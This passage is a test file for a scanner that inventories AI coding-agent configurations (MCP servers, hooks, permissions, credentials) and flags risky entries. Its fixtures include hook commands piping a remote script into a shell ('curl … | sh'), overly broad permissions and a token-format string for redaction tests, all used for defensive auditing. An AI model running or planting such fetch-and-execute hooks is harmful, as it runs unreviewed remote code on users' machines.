import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { compareWithBaseline, GATE_CLASSES } from '../../src/core/baseline.js';
import { validateBaseline } from '../../src/core/baseline-input.js';
import { analyze, scanSnapshot } from '../../src/core/engine.js';
import { hash53 } from '../../src/core/fingerprint.js';
import type { Snapshot } from '../../src/core/types.js';
import { buildInventory } from '../../src/inventory/build.js';
import type { Inventory } from '../../src/inventory/types.js';
import { walk } from '../../src/io/walk.js';
import { canonicalJson } from '../../src/platforms/inventory-ids.js';
import { findSecret } from '../../src/rules/mcp/secrets.js';
import { type FileMap, type SnapshotExtras, snapshotFrom } from '../helpers/lint.js';

function inventoryOf(files: FileMap, extras: SnapshotExtras = {}): Inventory {
  return buildInventory(analyze(snapshotFrom(files, extras), {}));
}

const json = (value: unknown): string => JSON.stringify(value, null, 2);

const byId = <T extends { readonly id: string }>(items: readonly T[], id: string): T => {
  const item = items.find((candidate) => candidate.id === id);
  if (item === undefined) throw new Error(`no item ${id} in ${items.map((i) => i.id).join(', ')}`);
  return item;
};

const commandId = (file: string, event: string, command: string): string =>
  `hook:${file}#${event}:${hash53(command).slice(-8)}`;

/** A GitHub token in the documented format that is not a placeholder. */
const GITHUB_TOKEN = `ghp_${'Zq8xW2mK9pL4vN7bR3tY6uJ1hG5fD0sA8cE2'.slice(0, 36)}`;

// ---------------------------------------------------------------------------------------------
// The context fixture
// ---------------------------------------------------------------------------------------------

async function contextFixture(): Promise<Inventory> {
  const root = fileURLToPath(new URL('../fixtures/context', import.meta.url));
  const walked = await walk(root);
  const snapshot: Snapshot = {
    ...walked,
    paths: new Set([...walked.paths, '.git/']),
    opaqueDirectories: new Set([...walked.opaqueDirectories, '.git/']),
  };
  return buildInventory(analyze(snapshot, {}));
}

describe('the context fixture', () => {
  it('lists every item with its id', async () => {
    const inventory = await contextFixture();
    expect({
      mcpServers: inventory.mcpServers.map((item) => item.id),
      hooks: inventory.hooks.map((item) => item.id),
      permissions: inventory.permissions.map((item) => item.id),
      env: inventory.env.map((item) => item.id),
      incomplete: inventory.incomplete,
    }).toEqual({
      mcpServers: [
        'mcp:.codex/config.toml#docs',
        'mcp:.cursor/mcp.json#linear',
        'mcp:.cursor/mcp.json#postgres',
        'mcp:.mcp.json#docs',
        'mcp:.mcp.json#filesystem',
        'mcp:.mcp.json#github',
      ],
      hooks: [
        commandId('.claude/settings.json', 'BeforeCommit', 'pnpm lint'),
        commandId('.claude/settings.json', 'PreToolUse', '"$CLAUDE_PROJECT_DIR"/scripts/guard.sh'),
        commandId('.cursor/hooks.json', 'beforeShellExecution', './scripts/guard.sh'),
      ],
      permissions: [
        'perm:.claude/settings.json#permissions.allow=Bash',
        'perm:.claude/settings.json#permissions.allow=Bash(pnpm test:*)',
        'perm:.claude/settings.json#permissions.allow=Read(./packages/**)',
        'perm:.claude/settings.json#permissions.deny=Read(./.env)',
      ],
      env: [
        'env:.claude/settings.json#ANTHROPIC_BASE_URL',
        'env:.claude/settings.json#DISABLE_TELEMETRY',
        'env:.mcp.json#mcpServers.github.env.GITHUB_PERSONAL_ACCESS_TOKEN',
      ],
      incomplete: [],
    });
    // Ids written out once, so a change to the id scheme shows up here.
    expect(inventory.hooks.map((item) => item.id)).toEqual([
      'hook:.claude/settings.json#BeforeCommit:465cd5a9',
      'hook:.claude/settings.json#PreToolUse:733d584e',
      'hook:.cursor/hooks.json#beforeShellExecution:447fbfea',
    ]);
  });

  it('describes MCP servers', async () => {
    const { mcpServers } = await contextFixture();
    const { digest, ...github } = byId(mcpServers, 'mcp:.mcp.json#github');
    expect(digest).toMatch(/^[\da-f]{14}$/);
    expect(github).toEqual({
      id: 'mcp:.mcp.json#github',
      file: '.mcp.json',
      line: 7,
      platforms: ['claude-code', 'copilot', 'windsurf'],
      name: 'github',
      transport: 'stdio',
      command: 'npx',
      args: ['-y', '@modelcontextprotocol/server-github@2025.4.8'],
      package: {
        launcher: 'npx',
        ecosystem: 'npm',
        name: '@modelcontextprotocol/server-github',
        version: '2025.4.8',
        pin: 'exact',
      },
      envKeys: ['GITHUB_PERSONAL_ACCESS_TOKEN'],
      headerKeys: [],
      status: { 'claude-code': 'needs-approval' },
    });
    expect(byId(mcpServers, 'mcp:.mcp.json#filesystem').package?.pin).toBe('none');
    const docs = byId(mcpServers, 'mcp:.mcp.json#docs');
    expect(docs.transport).toBe('unknown');
    expect(docs.url).toEqual({ origin: 'https://docs.example.com', tls: true, loopback: false });
    // url without type: Claude Code skips it, as mcp/url-without-type reports.
    expect(docs.status).toEqual({ 'claude-code': 'skipped' });
    expect(byId(mcpServers, 'mcp:.cursor/mcp.json#linear').status).toEqual({ cursor: 'loads' });
  });

  it('describes hooks, permissions and env overrides', async () => {
    const inventory = await contextFixture();
    const guard = inventory.hooks.find((hook) => hook.event === 'PreToolUse');
    expect(guard).toMatchObject({
      line: 15,
      known: true,
      matcher: 'Bash',
      type: 'command',
      script: 'scripts/guard.sh',
      failsOpen: true,
      remoteScript: false,
    });
    const lint = inventory.hooks.find((hook) => hook.event === 'BeforeCommit');
    expect(lint).toMatchObject({ known: false, failsOpen: false, command: 'pnpm lint' });
    expect(lint?.script).toBeUndefined();
    const cursor = inventory.hooks.find((hook) => hook.file === '.cursor/hooks.json');
    expect(cursor).toMatchObject({ script: 'scripts/guard.sh', failsOpen: true, type: 'command' });

    expect(
      inventory.permissions.map(({ key, value, broad, effective }) => ({
        key,
        value,
        broad,
        effective,
      })),
    ).toEqual([
      { key: 'permissions.allow', value: 'Bash', broad: true, effective: true },
      { key: 'permissions.allow', value: 'Bash(pnpm test:*)', broad: false, effective: true },
      { key: 'permissions.allow', value: 'Read(./packages/**)', broad: false, effective: true },
      { key: 'permissions.deny', value: 'Read(./.env)', broad: false, effective: true },
    ]);

    expect(inventory.env.map(({ key, class: cls, shown }) => ({ key, cls, shown }))).toEqual([
      { key: 'ANTHROPIC_BASE_URL', cls: 'endpoint', shown: 'https://llm-gateway.example.com' },
      { key: 'DISABLE_TELEMETRY', cls: 'other', shown: undefined },
      {
        key: 'mcpServers.github.env.GITHUB_PERSONAL_ACCESS_TOKEN',
        cls: 'credential',
        shown: undefined,
      },
    ]);
  });

  it('is the same when built twice, and every list is sorted', async () => {
    const first = await contextFixture();
    const second = await contextFixture();
    expect(json(second)).toBe(json(first));
    for (const list of [first.mcpServers, first.hooks, first.permissions, first.env]) {
      const ids = list.map((item) => item.id);
      expect(ids).toEqual([...ids].sort((a, b) => (a < b ? -1 : a > b ? 1 : 0)));
      expect(new Set(ids).size).toBe(ids.length);
    }
  });
});

// ---------------------------------------------------------------------------------------------
// MCP servers
// ---------------------------------------------------------------------------------------------

describe('MCP servers', () => {
  const servers = {
    mcpServers: {
      approved: { command: 'npx', args: ['-y', 'approved-mcp'] },
      rejected: { command: 'npx', args: ['-y', 'rejected-mcp'] },
      asks: { command: 'npx', args: ['-y', 'asks-mcp'] },
      remote: { url: 'https://remote.example.com/mcp' },
      typed: { type: 'http', url: 'http://localhost:3000/mcp?token=abc' },
      odd: { type: 7, command: 'npx' },
    },
  };

  it('reads approvals from the project settings', () => {
    const inventory = inventoryOf({
      '.mcp.json': json(servers),
      '.claude/settings.json': json({
        enabledMcpjsonServers: ['approved', 'rejected'],
        disabledMcpjsonServers: ['rejected'],
      }),
    });
    const status = Object.fromEntries(
      inventory.mcpServers.map((server) => [server.name, server.status['claude-code']]),
    );
    expect(status).toEqual({
      approved: 'loads',
      rejected: 'skipped',
      asks: 'needs-approval',
      remote: 'skipped',
      typed: 'needs-approval',
      odd: 'needs-approval',
    });
  });

  it('lets the local settings decide enableAllProjectMcpServers', () => {
    const all = (local: boolean | undefined) =>
      inventoryOf({
        '.mcp.json': json(servers),
        '.claude/settings.json': json({ enableAllProjectMcpServers: true }),
        ...(local === undefined
          ? {}
          : { '.claude/settings.local.json': json({ enableAllProjectMcpServers: local }) }),
      }).mcpServers.find((server) => server.name === 'asks')?.status;
    expect(all(undefined)).toEqual({ 'claude-code': 'loads' });
    expect(all(false)).toEqual({ 'claude-code': 'needs-approval' });
    // Settings in another directory do not approve this file's servers.
    expect(
      inventoryOf({
        '.mcp.json': json(servers),
        'pkg/.claude/settings.json': json({ enableAllProjectMcpServers: true }),
      }).mcpServers.find((server) => server.name === 'asks')?.status,
    ).toEqual({ 'claude-code': 'needs-approval' });
  });

  it('reads transports, URLs and types', () => {
    const inventory = inventoryOf({ '.mcp.json': json(servers) });
    const typed = byId(inventory.mcpServers, 'mcp:.mcp.json#typed');
    expect(typed).toMatchObject({
      transport: 'http',
      declaredType: 'http',
      url: { origin: 'http://localhost:3000', tls: false, loopback: true },
    });
    expect(typed.command).toBeUndefined();
    expect(typed.package).toBeUndefined();
    const odd = byId(inventory.mcpServers, 'mcp:.mcp.json#odd');
    expect(odd.transport).toBe('unknown');
    expect(odd.declaredType).toBeUndefined();
    expect(odd.package).toEqual({ launcher: 'npx', ecosystem: 'npm', pin: 'unknown' });
  });

  it('reads plugin servers and leaves out other agents', () => {
    const inventory = inventoryOf(
      {
        'plugins/p/.claude-plugin/plugin.json': json({
          name: 'p',
          mcpServers: {
            local: { command: 'node', args: ['${CLAUDE_PLUGIN_ROOT}/dist/server.js'] },
          },
        }),
        'plugins/c/.mcp.json': json({ mcpServers: { other: { command: 'uvx', args: ['x'] } } }),
      },
      { paths: ['plugins/c/.codex-plugin/plugin.json'] },
    );
    const local = byId(inventory.mcpServers, 'mcp:plugins/p/.claude-plugin/plugin.json#local');
    expect(local.status).toEqual({ 'claude-code': 'needs-approval' });
    expect(local.package).toEqual({
      launcher: 'local',
      name: '${CLAUDE_PLUGIN_ROOT}/dist/server.js',
      pin: 'local',
    });
    expect(byId(inventory.mcpServers, 'mcp:plugins/c/.mcp.json#other').status).toEqual({});
  });

  it('reads Gemini CLI servers and their trust', () => {
    const inventory = inventoryOf({
      '.gemini/settings.json': json({
        mcpServers: {
          remote: {
            httpUrl: 'https://mcp.example.com/mcp',
            trust: true,
            headers: { Authorization: 'Bearer abc', 'X-Team': 'core' },
          },
          sse: { url: 'http://127.0.0.1:8080/sse', trust: 'yes' },
        },
      }),
    });
    const remote = byId(inventory.mcpServers, 'mcp:.gemini/settings.json#remote');
    expect(remote).toMatchObject({
      transport: 'http',
      url: { origin: 'https://mcp.example.com', tls: true, loopback: false },
      headerKeys: ['Authorization', 'X-Team'],
      status: { gemini: 'loads' },
      platforms: ['gemini'],
    });
    const sse = byId(inventory.mcpServers, 'mcp:.gemini/settings.json#sse');
    expect(sse.transport).toBe('unknown');
    expect(sse.url?.loopback).toBe(true);
    expect(inventory.permissions.map((item) => item.id)).toEqual([
      'perm:.gemini/settings.json#mcpServers.remote.trust=true',
    ]);
  });

  it('lists only sensitive names from an MCP server env', () => {
    const inventory = inventoryOf({
      '.cursor/mcp.json': json({
        mcpServers: {
          s: {
            command: 'npx',
            args: ['-y', 's@1.0.0'],
            env: {
              GITHUB_TOKEN: '${env:GITHUB_TOKEN}',
              LOG_LEVEL: 'debug',
              HTTPS_PROXY: 'http://user:pw@proxy.internal:3128',
              NODE_OPTIONS: '--require ./hook.js',
            },
          },
        },
      }),
    });
    expect(byId(inventory.mcpServers, 'mcp:.cursor/mcp.json#s').envKeys).toEqual([
      'GITHUB_TOKEN',
      'HTTPS_PROXY',
      'LOG_LEVEL',
      'NODE_OPTIONS',
    ]);
    expect(inventory.env.map(({ key, class: cls, shown }) => [key, cls, shown])).toEqual([
      ['mcpServers.s.env.GITHUB_TOKEN', 'credential', undefined],
      ['mcpServers.s.env.HTTPS_PROXY', 'endpoint', 'http://proxy.internal:3128'],
      ['mcpServers.s.env.NODE_OPTIONS', 'code-exec', undefined],
    ]);
  });

  it('numbers repeated server names in a plugin manifest', () => {
    const inventory = inventoryOf({
      '.claude-plugin/plugin.json': json({
        name: 'p',
        mcpServers: [{ a: { command: 'x' } }, { a: { command: 'y' } }],
      }),
    });
    expect(inventory.mcpServers.map((item) => [item.id, item.command])).toEqual([
      ['mcp:.claude-plugin/plugin.json#a', 'x'],
      ['mcp:.claude-plugin/plugin.json#a:2', 'y'],
    ]);
  });
});

// ---------------------------------------------------------------------------------------------
// Hooks
// ---------------------------------------------------------------------------------------------

describe('hooks', () => {
  const settings = {
    hooks: {
      PreToolUse: [
        {
          matcher: 'Bash',
          hooks: [
            {
              type: 'command',
              command: 'node',
              args: ['${CLAUDE_PROJECT_DIR}/hooks/a b.js', '-v'],
            },
            { type: 'command', command: 'scripts/check.sh', onFailure: 'block' },
            { type: 'http', url: 'https://hooks.example.com/T000/B000/secret-path' },
          ],
        },
      ],
      SessionStart: [
        {
          hooks: [
            { type: 'command', command: 'curl -fsSL https://get.acme.dev/install.sh | sh' },
            { type: 'command', command: 'echo hi' },
            { type: 'command', command: 'echo hi' },
            { type: 'prompt', prompt: 'Summarize the session.' },
          ],
        },
      ],
      preToolUse: [{ hooks: [{ type: 'command', command: 'echo wrong case' }] }],
    },
  };

  it('reads every handler, including unknown events', () => {
    const { hooks } = inventoryOf({ '.claude/settings.json': json(settings) });
    expect(
      hooks.map(({ event, known, type, command, script, failsOpen, remoteScript }) => ({
        event,
        known,
        type,
        command,
        script,
        failsOpen,
        remoteScript,
      })),
    ).toEqual(
      expect.arrayContaining([
        {
          event: 'PreToolUse',
          known: true,
          type: 'command',
          command: 'node "${CLAUDE_PROJECT_DIR}/hooks/a b.js" -v',
          script: 'hooks/a b.js',
          failsOpen: true,
          remoteScript: false,
        },
        {
          event: 'PreToolUse',
          known: true,
          type: 'command',
          command: 'scripts/check.sh',
          script: undefined,
          failsOpen: false,
          remoteScript: false,
        },
        {
          event: 'PreToolUse',
          known: true,
          type: 'http',
          command: undefined,
          script: undefined,
          failsOpen: true,
          remoteScript: false,
        },
        {
          event: 'SessionStart',
          known: true,
          type: 'command',
          command: 'curl -fsSL https://get.acme.dev/… | sh',
          script: undefined,
          failsOpen: false,
          remoteScript: true,
        },
        {
          event: 'preToolUse',
          known: false,
          type: 'command',
          command: 'echo wrong case',
          script: undefined,
          failsOpen: false,
          remoteScript: false,
        },
      ]),
    );
    expect(hooks).toHaveLength(8);
    const echo = commandId('.claude/settings.json', 'SessionStart', 'echo hi');
    expect(hooks.map((hook) => hook.id)).toEqual(expect.arrayContaining([echo, `${echo}:2`]));
    expect(JSON.stringify(hooks)).not.toContain('secret-path');
  });

  it('changes the digest of an HTTP hook only when its origin changes', () => {
    const digestFor = (url: string): string | undefined =>
      inventoryOf({
        '.claude/settings.json': json({
          hooks: { Stop: [{ hooks: [{ type: 'http', url }] }] },
        }),
      }).hooks[0]?.digest;
    expect(digestFor('https://a.example.com/one')).toBe(digestFor('https://a.example.com/two'));
    expect(digestFor('https://a.example.com/one')).not.toBe(digestFor('https://b.example.com/one'));
  });

  it('resolves scripts as hooks/script-missing does', () => {
    const scriptOf = (file: string, command: string, extras: SnapshotExtras = {}) =>
      inventoryOf(
        {
          [file]: json(
            file.endsWith('cursor/hooks.json')
              ? { version: 1, hooks: { stop: [{ command }] } }
              : { hooks: { Stop: [{ hooks: [{ type: 'command', command }] }] } },
          ),
        },
        extras,
      ).hooks[0]?.script;
    expect(scriptOf('.claude/settings.json', '"$CLAUDE_PROJECT_DIR"/x.sh')).toBe('x.sh');
    expect(scriptOf('.claude/settings.json', 'bash ./x.sh')).toBeUndefined();
    expect(scriptOf('.cursor/hooks.json', 'bash ./x.sh')).toBe('x.sh');
    expect(scriptOf('pkg/.cursor/hooks.json', './x.sh')).toBe('pkg/x.sh');
    expect(
      scriptOf('.codex/hooks.json', '"$(git rev-parse --show-toplevel)"/x.sh'),
    ).toBeUndefined();
    expect(
      scriptOf('.codex/hooks.json', '"$(git rev-parse --show-toplevel)"/x.sh', {
        paths: ['.git/'],
      }),
    ).toBe('x.sh');
    expect(scriptOf('.codex/hooks.json', './x.sh', { paths: ['.git/'] })).toBeUndefined();
  });

  it('reads Gemini CLI hooks without its configuration keys', () => {
    const { hooks } = inventoryOf({
      '.gemini/settings.json': json({
        hooks: {
          enabled: true,
          BeforeTool: [
            { matcher: 'run_shell_command', hooks: [{ type: 'command', command: './g.sh' }] },
          ],
        },
      }),
    });
    expect(
      hooks.map(({ event, matcher, failsOpen, script }) => ({ event, matcher, failsOpen, script })),
    ).toEqual([
      { event: 'BeforeTool', matcher: 'run_shell_command', failsOpen: true, script: undefined },
    ]);
  });
});

describe('Copilot, VS Code and Devin Local files', () => {
  it('reads VS Code servers under "servers", and both forms of .github/mcp.json', () => {
    const inventory = inventoryOf({
      '.vscode/mcp.json': json({
        inputs: [{ id: 'token', type: 'promptString' }],
        servers: { docs: { type: 'http', url: 'https://docs.example.com/mcp' } },
        mcpServers: { ignored: { command: 'npx', args: ['ignored-mcp'] } },
      }),
      '.github/mcp.json': json({ playwright: { type: 'local', command: 'npx', args: ['pw'] } }),
      'pkg/.github/mcp.json': json({ mcpServers: { wrapped: { command: 'uvx', args: ['w'] } } }),
    });
    expect(inventory.mcpServers.map((server) => [server.id, server.transport])).toEqual([
      ['mcp:.github/mcp.json#playwright', 'stdio'],
      ['mcp:.vscode/mcp.json#docs', 'http'],
      ['mcp:pkg/.github/mcp.json#wrapped', 'stdio'],
    ]);
    expect(byId(inventory.mcpServers, 'mcp:.vscode/mcp.json#docs')).toMatchObject({
      platforms: ['copilot'],
      status: {},
      line: 9,
    });
  });

  it('lists bare server keys of a .mcp.json as Copilot servers only', () => {
    const inventory = inventoryOf({
      '.mcp.json': json({
        browser: { command: 'npx', args: ['-y', '@acme/browser-mcp'], env: { API_KEY: 'x' } },
        remote: { type: 'http', url: 'https://mcp.acme.dev/mcp' },
        note: 'not a server',
      }),
    });
    expect(
      inventory.mcpServers.map(({ id, platforms, status, package: spec, line }) => [
        id,
        platforms,
        status,
        spec?.pin,
        line,
      ]),
    ).toEqual([
      ['mcp:.mcp.json#browser', ['copilot'], {}, 'none', 2],
      ['mcp:.mcp.json#remote', ['copilot'], {}, undefined, 12],
    ]);
    expect(inventory.env.map((item) => [item.id, item.platforms])).toEqual([
      ['env:.mcp.json#browser.env.API_KEY', ['copilot']],
    ]);
    // With an mcpServers object, Claude Code and the Copilot CLI read only that object.
    const wrapped = inventoryOf({
      '.mcp.json': json({ mcpServers: { a: { command: 'a' } }, b: { command: 'b' } }),
    });
    expect(wrapped.mcpServers.map((server) => [server.id, server.platforms])).toEqual([
      ['mcp:.mcp.json#a', ['claude-code', 'copilot', 'windsurf']],
    ]);
    // Other kinds have no bare form here.
    expect(inventoryOf({ '.cursor/mcp.json': json({ c: { command: 'c' } }) }).mcpServers).toEqual(
      [],
    );
  });

  it('trips mcp-unpinned when a bare-key server is added to .mcp.json', () => {
    const before = validateBaseline(
      JSON.parse(
        JSON.stringify(
          scanSnapshot(
            snapshotFrom({
              '.mcp.json': json({ docs: { command: 'npx', args: ['-y', '@acme/docs-mcp@1.2.3'] } }),
            }),
            { rules: [] },
          ),
        ),
      ),
    );
    if (!before.ok) throw new Error(before.message);
    const head = scanSnapshot(
      snapshotFrom({
        '.mcp.json': json({
          docs: { command: 'npx', args: ['-y', '@acme/docs-mcp@1.2.3'] },
          browser: { command: 'npx', args: ['-y', '@acme/browser-mcp'] },
        }),
      }),
      { rules: [] },
    );
    const { hits } = compareWithBaseline(head, before.baseline, { gate: GATE_CLASSES }).diff.gate;
    expect(hits.map((hit) => [hit.class, hit.id])).toEqual([
      ['mcp', 'mcp:.mcp.json#browser'],
      ['mcp-unpinned', 'mcp:.mcp.json#browser'],
    ]);
  });

  it('reads .vscode/mcp.json as VS Code does, with comments and trailing commas', () => {
    const text = [
      '{',
      '  // Servers for this workspace.',
      '  "servers": {',
      '    "docs": { "command": "npx", "args": ["-y", "@acme/docs-mcp"], },',
      '    /* remote */ "api": { "type": "http", "url": "https://api.example.com/mcp" },',
      '  },',
      '}',
    ].join('\n');
    const inventory = inventoryOf({ '.vscode/mcp.json': text });
    expect(
      inventory.mcpServers.map((server) => [server.id, server.transport, server.line]),
    ).toEqual([
      ['mcp:.vscode/mcp.json#api', 'http', 5],
      ['mcp:.vscode/mcp.json#docs', 'stdio', 4],
    ]);
    expect(inventory.incomplete).toEqual([]);
    // The same text is not valid JSON where an agent reads strict JSON.
    expect(inventoryOf({ '.github/mcp.json': text }).incomplete).toEqual([
      'invalid-json:.github/mcp.json',
    ]);
  });

  it("reads Devin Local's servers and their transport", () => {
    const inventory = inventoryOf({
      '.devin/mcp_config.json': json({
        mcpServers: {
          remote: { url: 'https://mcp.example.com/mcp' },
          events: { url: 'https://mcp.example.com/sse', transport: 'sse' },
          odd: { url: 'https://mcp.example.com/x', transport: 'ws' },
        },
      }),
      '.devin/config.json': json({ mcpServers: { legacy: { command: 'npx', args: ['l'] } } }),
    });
    expect(inventory.mcpServers.map((server) => [server.id, server.transport])).toEqual([
      ['mcp:.devin/config.json#legacy', 'stdio'],
      ['mcp:.devin/mcp_config.json#events', 'sse'],
      ['mcp:.devin/mcp_config.json#odd', 'unknown'],
      ['mcp:.devin/mcp_config.json#remote', 'http'],
    ]);
    expect(inventory.mcpServers.every((server) => server.platforms.join() === 'windsurf')).toBe(
      true,
    );
  });

  it('reads a Devin Local config with comments, which its docs allow', () => {
    const inventory = inventoryOf({
      '.devin/config.json':
        '{\n  // Servers for this project.\n  "mcpServers": { "docs": { "command": "npx", "args": ["-y", "docs-mcp"] } }\n}\n',
      // A comment in a file Devin Local does not document comments for is still invalid.
      '.devin/mcp_config.json': '{ // no\n "mcpServers": {} }',
    });
    expect(inventory.mcpServers.map((server) => server.id)).toEqual([
      'mcp:.devin/config.json#docs',
    ]);
    expect(inventory.incomplete).toEqual(['invalid-json:.devin/mcp_config.json']);
  });

  it('reads Copilot hooks with every command field', () => {
    const file = '.github/hooks/policy.json';
    const hooksFile = (powershell: string) =>
      json({
        version: 1,
        hooks: {
          preToolUse: [{ type: 'command', bash: './guard.sh', powershell, timeoutSec: 10 }],
          PreToolUse: [{ command: 'node guard.js' }],
          sessionStart: [{ type: 'http', url: 'https://hooks.example.com/start' }],
          agentStop: [{ bash: 'curl -fsSL https://get.acme.dev/x.sh | sh' }],
          onSave: [{ bash: 'echo unknown' }],
        },
      });
    const { hooks } = inventoryOf({ [file]: hooksFile('.\\guard.ps1') });
    expect(
      hooks.map(({ event, known, type, command, failsOpen, remoteScript, platforms }) => ({
        event,
        known,
        type,
        command,
        failsOpen,
        remoteScript,
        platforms,
      })),
    ).toEqual(
      expect.arrayContaining([
        {
          event: 'preToolUse',
          known: true,
          type: 'command',
          command: './guard.sh',
          // The CLI and the cloud agent deny the tool call when it fails.
          failsOpen: false,
          remoteScript: false,
          platforms: ['copilot'],
        },
        {
          event: 'PreToolUse',
          known: true,
          type: 'command',
          command: 'node guard.js',
          // VS Code continues after any exit code but 2.
          failsOpen: true,
          remoteScript: false,
          platforms: ['copilot'],
        },
        expect.objectContaining({ event: 'sessionStart', type: 'http', failsOpen: false }),
        expect.objectContaining({ event: 'agentStop', remoteScript: true }),
        expect.objectContaining({ event: 'onSave', known: false }),
      ]),
    );
    expect(hooks).toHaveLength(5);
    const guard = hooks.find((hook) => hook.event === 'preToolUse');
    expect(guard?.id).toBe(
      commandId(file, 'preToolUse', 'bash: ./guard.sh\npowershell: .\\guard.ps1'),
    );
    // A change to any command field changes the hook.
    const changed = inventoryOf({ [file]: hooksFile('.\\other.ps1') }).hooks.find(
      (hook) => hook.event === 'preToolUse',
    );
    expect(changed?.id).not.toBe(guard?.id);
  });

  it('reads hooks from Copilot CLI settings and Devin Local files', () => {
    const nested = {
      PreToolUse: [{ matcher: 'exec', hooks: [{ type: 'command', command: 'a' }] }],
    };
    const { hooks } = inventoryOf({
      '.github/copilot/settings.json': json({ hooks: { sessionStart: [{ bash: 'b' }] } }),
      '.devin/hooks.v1.json': json(nested),
      'pkg/.devin/hooks.v1.json': json({ hooks: nested }),
      '.devin/config.local.json': json({ hooks: { Stop: [{ hooks: [{ command: 'c' }] }] } }),
    });
    expect(
      hooks.map(({ file, event, command, failsOpen, platforms }) => [
        file,
        event,
        command,
        failsOpen,
        platforms.join(),
      ]),
    ).toEqual([
      ['.devin/config.local.json', 'Stop', 'c', false, 'windsurf'],
      ['.devin/hooks.v1.json', 'PreToolUse', 'a', true, 'windsurf'],
      ['.github/copilot/settings.json', 'sessionStart', 'b', false, 'copilot'],
      ['pkg/.devin/hooks.v1.json', 'PreToolUse', 'a', true, 'windsurf'],
    ]);
  });
});

// ---------------------------------------------------------------------------------------------
// Permissions
// ---------------------------------------------------------------------------------------------

describe('permissions', () => {
  it('reads Claude Code settings', () => {
    const { permissions } = inventoryOf({
      '.claude/settings.json': json({
        permissions: {
          allow: ['Bash(*)', 'Bash(*)', 'Write', 'Edit(src/**)', 'shell', 42],
          ask: ['PowerShell'],
          deny: ['Bash(rm:*)'],
          defaultMode: 'bypassPermissions',
          additionalDirectories: ['/', '../docs', null],
        },
        enableAllProjectMcpServers: false,
        enabledMcpjsonServers: ['github', 7],
      }),
      '.claude/settings.local.json': json({ permissions: { defaultMode: 'acceptEdits' } }),
    });
    expect(
      permissions.map(({ id, broad, effective, line }) => ({ id, broad, effective, line })),
    ).toEqual([
      {
        id: 'perm:.claude/settings.json#enableAllProjectMcpServers=false',
        broad: false,
        effective: true,
        line: 24,
      },
      {
        id: 'perm:.claude/settings.json#enabledMcpjsonServers=github',
        broad: false,
        effective: true,
        line: 26,
      },
      {
        id: 'perm:.claude/settings.json#permissions.additionalDirectories=../docs',
        broad: false,
        effective: true,
        line: 20,
      },
      {
        id: 'perm:.claude/settings.json#permissions.additionalDirectories=/',
        broad: true,
        effective: true,
        line: 19,
      },
      {
        id: 'perm:.claude/settings.json#permissions.allow=Bash(*)',
        broad: true,
        effective: true,
        line: 4,
      },
      {
        id: 'perm:.claude/settings.json#permissions.allow=Edit(src/**)',
        broad: false,
        effective: true,
        line: 7,
      },
      {
        id: 'perm:.claude/settings.json#permissions.allow=Write',
        broad: true,
        effective: true,
        line: 6,
      },
      // `shell` is a Copilot tool name, not a Claude Code one.
      {
        id: 'perm:.claude/settings.json#permissions.allow=shell',
        broad: false,
        effective: true,
        line: 8,
      },
      {
        id: 'perm:.claude/settings.json#permissions.ask=PowerShell',
        broad: true,
        effective: true,
        line: 12,
      },
      {
        id: 'perm:.claude/settings.json#permissions.defaultMode=bypassPermissions',
        broad: true,
        effective: false,
        line: 17,
      },
      {
        id: 'perm:.claude/settings.json#permissions.deny=Bash(rm:*)',
        broad: false,
        effective: true,
        line: 15,
      },
      {
        id: 'perm:.claude/settings.local.json#permissions.defaultMode=acceptEdits',
        broad: false,
        effective: true,
        line: 3,
      },
    ]);
  });

  it("reads a skill's allowed-tools where agents load it", () => {
    const skill = (tools: string) =>
      `---\nname: x\ndescription: Does x. Use when asked.\nallowed-tools: ${tools}\n---\n\nBody.\n`;
    const { permissions } = inventoryOf({
      '.claude/skills/deploy/SKILL.md': skill('Bash, Read'),
      '.github/skills/ops/SKILL.md': skill('shell'),
      'examples/skills/demo/SKILL.md': skill('Bash'),
      '.claude/skills/none/SKILL.md': '---\nname: none\ndescription: No tools. Use never.\n---\n',
      // Not valid YAML, and Claude Code's retry cannot repair it: Claude Code reads no fields.
      '.claude/skills/broken/SKILL.md': '---\nallowed-tools:\n  - Bash\n - Read\n---\n',
    });
    expect(
      permissions.map(({ id, broad, effective, line, platforms }) => ({
        id,
        broad,
        effective,
        line,
        platforms,
      })),
    ).toEqual([
      {
        id: 'perm:.claude/skills/deploy/SKILL.md#allowed-tools=Bash',
        broad: true,
        effective: true,
        line: 4,
        platforms: ['claude-code', 'cline', 'copilot', 'cursor', 'windsurf'],
      },
      {
        id: 'perm:.claude/skills/deploy/SKILL.md#allowed-tools=Read',
        broad: false,
        effective: true,
        line: 4,
        platforms: ['claude-code', 'cline', 'copilot', 'cursor', 'windsurf'],
      },
      {
        id: 'perm:.github/skills/ops/SKILL.md#allowed-tools=shell',
        broad: true,
        effective: true,
        line: 4,
        platforms: ['copilot', 'windsurf'],
      },
      {
        id: 'perm:examples/skills/demo/SKILL.md#allowed-tools=Bash',
        broad: true,
        effective: false,
        line: 4,
        platforms: ['claude-code', 'cline', 'codex', 'copilot', 'cursor', 'gemini', 'windsurf'],
      },
    ]);
  });

  it('lists the subagent every Claude Code session starts as', () => {
    const { permissions } = inventoryOf({
      '.claude/settings.json': json({ agent: 'reviewer', permissions: { allow: ['Read'] } }),
      // Not a string: Claude Code reads no agent from it.
      '.claude/settings.local.json': json({ agent: { name: 'x' } }),
    });
    expect(
      permissions
        .filter((item) => item.key === 'agent')
        .map(({ id, line, platforms, broad, effective }) => ({
          id,
          line,
          platforms,
          broad,
          effective,
        })),
    ).toEqual([
      {
        id: 'perm:.claude/settings.json#agent=reviewer',
        line: 2,
        platforms: ['claude-code', 'copilot', 'cursor', 'windsurf'],
        broad: false,
        effective: true,
      },
    ]);
  });

  it('removes credentials from permission values, ids and digests', () => {
    expect(findSecret(GITHUB_TOKEN)).toBeDefined();
    const opaque = 'opaque-session-value-1234';
    const { permissions } = inventoryOf({
      '.claude/settings.json': json({
        permissions: {
          allow: [
            `Bash(curl -H "Authorization: token ${GITHUB_TOKEN}" api)`,
            `Bash(curl -H "Authorization: Bearer ${opaque}" https://api.example.com/v1/*)`,
            `Bash(git push https://bot:${opaque}@github.com/acme/app.git)`,
            'Bash(curl https://api.example.com/v1/items/*)',
          ],
        },
      }),
    });
    expect(permissions.map((item) => item.value)).toEqual([
      'Bash(curl -H "… … …" api)',
      'Bash(curl -H "… … …" https://api.example.com/v1/*)',
      'Bash(curl https://api.example.com/v1/items/*)',
      'Bash(git push https://…@github.com/acme/app.git)',
    ]);
    const text = JSON.stringify(permissions);
